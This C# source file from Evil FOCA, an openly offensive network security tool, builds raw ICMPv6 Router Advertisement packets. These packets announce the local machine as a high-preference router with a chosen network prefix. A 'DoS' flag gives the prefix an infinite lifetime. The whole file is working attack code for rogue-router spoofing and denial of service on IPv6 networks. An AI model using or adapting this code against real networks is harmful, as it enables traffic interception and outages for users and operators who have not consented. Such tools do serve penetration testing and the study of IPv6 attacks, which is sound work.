/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.NetworkInformation;
using System.IO;

namespace evilfoca.ICMPv6
{
    class NeighborRouterAdvertisement
    {
        private PhysicalAddress PhysicalAddress;
        private bool DoSPacket = false;
        private byte[] prefix;

        public NeighborRouterAdvertisement(PhysicalAddress localMac)
        {
            this.PhysicalAddress = localMac;
        }

        public NeighborRouterAdvertisement(PhysicalAddress localMac, byte[] prefix, bool isDosPacket)
            : this(localMac)
        {
            this.prefix = prefix;
            this.DoSPacket = isDosPacket;
        }

        public byte[] GetBytes()
        {
            //byte[] raw = new byte[56+24];
            byte[] raw = new byte[56];

            MemoryStream ms = new MemoryStream(raw);
            BinaryWriter bw = new BinaryWriter(ms);

            // Type, 0x86 -> router advertisement
            bw.Write((byte)0x86);
            // code
            bw.Write((byte)0x00);
            // Checksum (2 bytes), lo autorrellena luego
            bw.Write((byte)0x00);
            bw.Write((byte)0x00);
            // Cur hop limit
            bw.Write((byte)0xFF);
            // Flags, 0x8 -> default router preference: high (1)
            // Flags, 0x44 -> default router preference: high (1) & Other configuration
            bw.Write((byte)0x48);
            // router lifetime
            bw.Write(new byte[] { 0x7, 0x8 });
            // reachable time
            bw.Write(new byte[] { 0x0, 0x0, 0x0, 0x0 });
            // retrans time
            bw.Write(new byte[] { 0x0, 0x0, 0x0, 0x0 });
            {
                // Type: prefix information
                bw.Write((byte)0x3);
                // Length -> 4 (32 bytes)
                bw.Write((byte)0x4);
                // prefix length
                bw.Write((byte)0x40);
                // Flags -> Onlink, autonomous address configuration
                bw.Write((byte)0xc0);
                // Valid lifetime
                if (DoSPacket)
                    bw.Write(new byte[] { 0xff, 0xff, 0xff, 0xff });
                else
                    bw.Write(new byte[] { 0x00, 0x00, 0x00, 0x05 });
                // prefered lifetime
                if (DoSPacket)
                    bw.Write(new byte[] { 0xff, 0xff, 0xff, 0xff });
                else
                    bw.Write(new byte[] { 0x00, 0x00, 0x00, 0x05 });
                // reserved
                bw.Write(new byte[] { 0x00, 0x00, 0x00, 0x00 });


                // prefix (prefijo de la IP del router?) <--Prefijo de la red con la que se tiene que configurar la IPv6 del equipo
                if (DoSPacket)
                {
                    bw.Write(prefix);
                    bw.Write(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                }
                else
                {
                    if (prefix != null)
                        bw.Write(prefix);
                    else
                        bw.Write(new byte[] { 0xfd, 0xe5, 0xbe, 0x81, 0xc0, 0x3b, 0xda, 0xf4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03 });
                }
            }
            {
                // type (source link layer)
                bw.Write((byte)0x01);
                // length
                bw.Write((byte)0x01);
                // Mac local
                bw.Write(PhysicalAddress.GetAddressBytes());
            }

            return raw;
        }

    }
}
